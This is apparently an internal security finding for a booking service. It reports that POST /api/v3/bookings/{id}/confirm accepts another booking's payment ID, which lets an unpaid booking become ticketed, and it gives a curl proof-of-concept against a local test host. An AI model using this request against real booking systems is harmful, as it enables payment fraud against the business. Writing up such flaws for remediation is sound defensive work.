# [Critical] Booking confirmed with another booking's payment on POST /api/v3/bookings/{id}/confirm

**Owner:** booking-svc (#booking-eng)  **Status:** OPEN  **OWASP:** API6:2023 Unrestricted Business Flow  **CWE:** CWE-841


## Business impact
Direct revenue loss / financial integrity break in the booking flow; exploitable by any logged-in agent.

## Proof (oracle: `flow_bypass`)
Unpaid booking 1062 reached TICKETED using payment 1064 of booking 1059

```bash
curl -s -X POST 'http://127.0.0.1:8100/api/v3/bookings/1062/confirm' -H 'Authorization: Bearer $A1_AGENT_TOKEN' -H 'Content-Type: application/json' -d '{"payment_id": "<PAYMENT_ID_OF_OTHER_BOOKING>"}'
```
